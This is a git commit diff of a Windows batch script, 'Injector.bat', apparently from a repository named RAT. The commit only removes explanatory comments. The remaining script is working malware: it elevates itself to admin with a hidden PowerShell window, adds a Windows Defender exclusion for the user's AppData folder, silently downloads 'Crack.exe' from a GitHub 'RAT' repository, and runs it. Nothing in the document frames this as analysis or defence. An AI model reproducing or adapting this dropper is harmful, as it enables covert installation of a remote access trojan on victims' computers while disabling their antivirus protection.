a0dee8f9093884cdd0dd55d414fa6fbb6ac7c559
GLICHED-HACKER <143979463+GLICHED-HACKER@users.noreply.github.com>
2025-06-30 13:49:29 -0400

    Update Injector.bat

--- Injector.bat
+++ Injector.bat
@@ -1,22 +1,13 @@
 @echo off
-:: Relaunch as admin if not elevated
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
     exit /b
 )
-
-:: Set paths
 set "APPDATA_PATH=%USERPROFILE%\AppData"
 set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
 set "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.exe"
-
-:: Add Windows Defender exclusion silently
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
-
-:: Download file silently
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
-
-:: Run file silently
 start "" "%TARGET_FILE%"
 exit
